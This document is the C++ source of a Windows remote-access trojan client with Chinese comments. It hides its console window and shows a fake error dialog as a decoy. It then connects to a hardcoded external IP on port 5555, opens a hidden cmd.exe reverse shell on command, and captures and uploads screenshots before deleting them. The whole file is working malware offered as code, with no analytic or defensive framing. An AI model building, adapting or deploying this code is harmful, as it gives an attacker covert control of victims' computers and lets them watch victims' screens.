#include<WINSOCK2.H>
#include<STDIO.H>
#include<iostream>
#include<cstring>
#include<windows.h>
#include<thread>
#include<process.h>
#include <atlimage.h>
#include <fstream>
#include <atltime.h>
#include<tchar.h>
using namespace std;
#pragma comment(lib, "ws2_32.lib")
#pragma comment(linker,"/subsystem:\"windows\" /entry:\"mainCRTStartup\"")//不显示窗口

#define MAX_SIZE 10
#define ONE_PAGE 1024
HANDLE hStdInRead, hStdInWrite;
HANDLE hStdOutRead, hStdOutWrite;

SECURITY_ATTRIBUTES saIn, saOut;

//SOCKET clientSocket;
SOCKET sclient;


CString ScreenShot()
{
	HDC hDCScreen = ::GetDC(NULL);//首先获取到屏幕的句柄    
	int nBitPerPixel = GetDeviceCaps(hDCScreen, BITSPIXEL);//获取到每个像素的bit数目
	int nWidthScreen = GetDeviceCaps(hDCScreen, HORZRES);
	int nHeightScreen = GetDeviceCaps(hDCScreen, VERTRES);
	//创建一个CImage的对象
	CImage m_MyImage;
	//Create实例化CImage，使得其内部的画布大小与屏幕一致
	m_MyImage.Create(nWidthScreen, nHeightScreen, nBitPerPixel);
	//获取到CImage的 HDC,但是需要手动ReleaseDC操作,下面是MSDN的说明
	//Because only one bitmap can be selected into a device context at a time, 
	//you must call ReleaseDC for each call to GetDC.
	HDC hDCImg = m_MyImage.GetDC();
	//使用bitblt 将屏幕的DC画布上的内容 拷贝到CImage上
	BitBlt(hDCImg, 0, 0, nWidthScreen, nHeightScreen, hDCScreen, 0, 0, SRCCOPY);

	//保存到的文件名
	CString strFileName("./");
	//CreateDirectory((LPCTSTR)strFileName, NULL);
	//CTime t = CTime::GetCurrentTime();
	//CString tt = t.Format(_T("%Y-%m-%d_%H-%M-%S"));
	strFileName += "newImage";
	strFileName += _T(".PNG");

	//直接保存吧
	m_MyImage.Save(strFileName, Gdiplus::ImageFormatPNG);

	//前面调用了GetDC所以需要调用ReleaseDC释放掉
	//详情请参见MSDN
	m_MyImage.ReleaseDC();
	return strFileName;
}



BOOL CreateTwoPipe()
{
	DWORD dwRet;
	saIn.nLength = sizeof(SECURITY_ATTRIBUTES);
	saIn.bInheritHandle = TRUE;
	saIn.lpSecurityDescriptor = NULL;
	dwRet = CreatePipe(&hStdInRead, &hStdInWrite, &saIn, 0);	//创建管道
	if (!dwRet)
	{
		printf("failed to create in pipe...\n");
		return FALSE;
	}

	saOut.nLength = sizeof(SECURITY_ATTRIBUTES);
	saOut.bInheritHandle = TRUE;
	saOut.lpSecurityDescriptor = NULL;
	dwRet = CreatePipe(&hStdOutRead, &hStdOutWrite, &saOut, 0);	//和上面一样的管道
	if (!dwRet)
	{
		printf("failed to create in pipe...\n");
		return FALSE;
	}

	STARTUPINFO si;
	ZeroMemory(&si, sizeof(si));
	si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
	si.wShowWindow = SW_HIDE;
	si.hStdInput = hStdInRead;
	si.hStdOutput = hStdOutWrite;
	si.hStdError = hStdOutWrite;
	char cmdline[] = "cmd.exe";
	PROCESS_INFORMATION ProcessInformation;
	dwRet = CreateProcess(NULL, cmdline, NULL, NULL, 1, 0, NULL, NULL, &si, &ProcessInformation);

	return TRUE;

}

void ReadOutPutReadCmd(LPVOID lPvoid)
{
	DWORD dwByteRecv;
	char Buf[1024] = { 0 };
	int ret;

	cout << "打开线程了" << endl;
	
	while (1)
	{
		cout << "写入设备？" << endl;
		memset(Buf, 0, sizeof(Buf));
		PeekNamedPipe(hStdOutRead, Buf, 1024, &dwByteRecv, 0, 0);
		if (dwByteRecv)
		{
			ret = ReadFile(hStdOutRead, Buf, dwByteRecv, &dwByteRecv, 0);
			if (!ret)
				break;
			ret = send(sclient, Buf, dwByteRecv, 0);
			cout<< ret << "发送的内容: "<< Buf << endl;
			if (ret <= 0)
				break;
		}
		Sleep(100);
	}

}


int main()
{

	MessageBox(NULL, "错误! (Error code: -5)", "警告", 0 | MB_ICONSTOP);

	WORD sockVersion = MAKEWORD(2, 2);
	WSADATA data;
	if (WSAStartup(sockVersion, &data) != 0)
	{
		return 0;
	}
	while (true)
	{
		sclient = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
		if (sclient == INVALID_SOCKET)
		{
			printf("invalid socket!");
			return 0;
		}

		sockaddr_in serAddr;
		serAddr.sin_family = AF_INET;
		serAddr.sin_port = htons(5555);
		serAddr.sin_addr.S_un.S_addr = inet_addr("47.95.4.219");
		if (connect(sclient, (sockaddr *)&serAddr, sizeof(serAddr)) == SOCKET_ERROR)
		{  //连接失败 
			printf("connect error !");
			closesocket(sclient);
			return 0;
		}

		//thread t(heartbeat, sclient);	//开始子线程接受心跳包
		//t.detach();
		
		//send()用来将数据由指定的socket传给对方主机
		//int send(int s, const void * msg, int len, unsigned int flags)
		//s为已建立好连接的socket，msg指向数据内容，len则为数据长度，参数flags一般设0
		//成功则返回实际传送出去的字符数，失败返回-1，错误原因存于error 

		char recData[255] = {0};
		char cmd;

		while (1)	//被控端主循环
		{
			int ret = recv(sclient, recData, 255, 0);
			if (ret <= 0)
			{
				cout << "套接字已经被关闭了" << endl;
				break;
			}
			recData[ret] = '\0';	//不这么做会导致字符串长度错误 Java发来的字符串没有\0
			//cout << recData << endl;

			if (!strcmp(recData, "Heart"))
			{
				cout << "心跳包: "<<recData << endl;
			}
			else if (!strcmp(recData, "shell"))
			{
				cout << "接收到shell进入shell状态" << endl;
				if (!CreateTwoPipe())	//创建管道 并且打开cmd
				{
					printf("failed to create pipe...\n");
					return 0;
				}
				DWORD dwByteRecv = 0;
				char Buf[1024] = { 0 };
				_beginthread(ReadOutPutReadCmd, 0, NULL);
				while (1)	//shell循环
				{
					ret = recv(sclient, Buf, 1024, 0);
					cout << "dwByteRecv:" << ret << endl << Buf << endl;
					if (ret <= 0)
					{
						cout << "套接字已经被关闭了" << endl;
						break;
					}
					Buf[ret] = '\0';
					if (!strcmp(Buf, "ES"))	//比较是否退出shell
					{
						cout << "退出shell循环" << endl;
						break;	//退出shell循环
					}
					if (!strcmp(Buf, "Heart"))	//心跳包的话
					{
						cout << "心跳包" << endl;
						//break;	//退出shell循环
						continue;
					}
					
					Buf[ret] = '\r';
					Buf[ret + 1] = '\n';
					Buf[ret + 2] = 0;
					//cout << "2" << endl;
					//printf("recv: %s", Buf);
					dwByteRecv = ret;
					ret = WriteFile(hStdInWrite, Buf, dwByteRecv + 2, &dwByteRecv, 0);
					cout << "写入管道,内容["<<Buf<<"]" << endl;
					if (!ret)
					{
						break;
					}
				}
			}else if (!strcmp(recData, "getimage"))
			{
				char szBuf[ONE_PAGE] = { 0 };
				ScreenShot();
				Sleep(100);
				send(sclient, "11", strlen("11"), 0);
				Sleep(100);
				char path[] = "./newImage.png";
				fstream fs;
				fs.open(path, fstream::in | fstream::binary);
				fs.seekg(0, fstream::end);//以最后的位置为基准不偏移
				int nlen = fs.tellg();//取得文件大小
				cout << "大小: " << nlen << endl;
				fs.seekg(0, fstream::beg);
				sprintf(szBuf, "%d", nlen);
				send(sclient, szBuf, strlen(szBuf), 0);
				Sleep(10);

				while (!fs.eof())
				{
					cout << "1" << endl;
					fs.read(szBuf, ONE_PAGE);
					cout << "2" << endl;
					int len = fs.gcount();
					cout << "3" << endl;
					send(sclient, szBuf, len, 0);
					cout << "发送" << endl;
				}
				fs.close();
				cout << "结束" << endl;
				Sleep(1000);
				DeleteFile("./newImage.png");
			}

		}
		closesocket(sclient);
	}


	WSACleanup();
	return 0;

}